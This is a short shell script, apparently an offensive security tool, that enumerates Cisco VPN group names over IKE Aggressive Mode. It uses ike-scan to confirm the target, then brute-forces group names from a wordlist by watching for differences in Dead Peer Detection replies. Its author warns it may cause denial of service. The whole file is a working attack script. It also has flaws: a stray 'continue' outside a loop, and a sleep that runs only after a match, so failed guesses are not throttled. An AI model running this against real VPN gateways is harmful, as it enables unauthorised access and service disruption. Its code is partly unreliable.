#!/bin/sh
#Cisco group name enumeration
#Requires: ike-scan http://www.nta-monitor.com/tools-resources/security-tools/ike-scan
#Usage: ./groupenum.sh target  wordlist.txt
#Disclaimer: I accept no responsibility for any issues caused by running this tool, run at your own risk. i.e. it's not my fault if you cause a DoS condition, modify the sleep time accordingly.

#Determine if device is vulnerable
echo "[+]Checking if Aggressive Mode is enabled..."
if ike-scan $1 -M -A --id=admin | grep  -i "aggressive"
 then
 echo "[+]Aggressive mode enabled, checking device is a Cisco endpoint..."
 if ike-scan $1 -M -A --id=admin | grep -i "cisco" 
  then
  echo "[+] Confirmed Cisco endpoint, checking DPD response..."
  if ike-scan $1 -M -A --id=thisgroupnamedoesnotexit234585 | grep -i "dead" 
   then echo "[-]Device does not appear to be vulnerable"
   exit 0
  else
   echo "[+]Device appears to be vulnerable"
   continue
  fi

#Brute force groupname
  echo "[+]Brute forcing group name with:" $2
  while read file
   do
   if ike-scan $1 -M -A --id=$file | grep -i "dead" && sleep 0.4
    then echo "[+]Group name =" $file
    exit 0
   fi
   done < $2
  echo  "[+]Trying IP address as group name:" $1
  if ike-scan $1 -M -A --id=$1 | grep -i "dead"
   then echo "[+]Group name =" $1
   exit 0
  fi
 else
  echo "[-]Not a Cisco endpoint"
 fi
else
 echo "[-]Aggressive mode handshake not returned, try the script a few more times"
 echo "If you know the device accepts aggressive mode modify the script to use the correct transform set by modifying line 8."
 echo "Example:  ike-scan $1 -M -A --trans=7/256,2,1,2 --id=test"
 exit 0
fi
 echo "[-]Group name not found - try a better wordlist"
